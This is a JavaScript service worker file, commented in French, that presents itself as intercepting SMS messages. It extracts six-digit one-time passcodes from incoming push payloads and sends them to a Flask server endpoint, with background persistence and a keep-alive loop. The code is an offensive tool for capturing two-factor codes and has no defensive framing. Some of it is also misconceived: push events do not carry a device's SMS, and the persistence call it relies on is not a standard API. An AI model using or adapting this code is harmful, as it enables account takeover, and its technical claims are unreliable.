self.addEventListener('install', event => {
    console.log("📌 Service Worker installé !");
    self.skipWaiting(); // Force l'activation immédiate du SW
});

self.addEventListener('activate', event => {
    console.log("✅ Service Worker activé !");
    event.waitUntil(self.clients.claim()); // Prend le contrôle des clients immédiatement
});

self.addEventListener('push', event => {
    if (!event.data) return;

    let smsContent = event.data.text();
    console.log("📩 SMS intercepté :", smsContent);

    // Extraction du code OTP (6 chiffres ou format avec tiret)
    let otpCode = smsContent.match(/\b\d{6}\b|\b\d{3}-\d{3}\b/);
    
    if (otpCode) {
        let otp = otpCode[0].replace("-", ""); // Nettoyage format OTP
        console.log("🔍 Code OTP détecté :", otp);

        // Envoyer OTP au serveur Flask
        fetch('/receive_otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ otp: otp })
        }).then(response => {
            if (response.ok) {
                console.log("📤 OTP envoyé avec succès !");
            } else {
                console.error("❌ Échec de l'envoi OTP");
            }
        }).catch(error => {
            console.error("⚠️ Erreur réseau :", error);
        });
    }
});

// Garder le Service Worker actif en arrière-plan
self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
    console.log("✅ Service Worker activé et prêt.");

    // Tentative de persistance (si supporté par le navigateur)
    if (self.registration.keepAlive) {
        self.registration.keepAlive();
        console.log("🔄 Persistance activée.");
    } else {
        console.warn("⚠️ Persistance non supportée par ce navigateur.");
    }
});

// Reconnexion automatique pour maintenir l'écoute active
setInterval(() => {
    console.log("🔄 Vérification de l'activité du Service Worker...");
    fetch('/keep_alive')
        .then(response => console.log("✅ Connexion maintenue"))
        .catch(error => console.warn("⚠️ Service Worker suspendu, tentative de reconnexion...", error));
}, 30000); // Vérifie toutes les 30 secondes
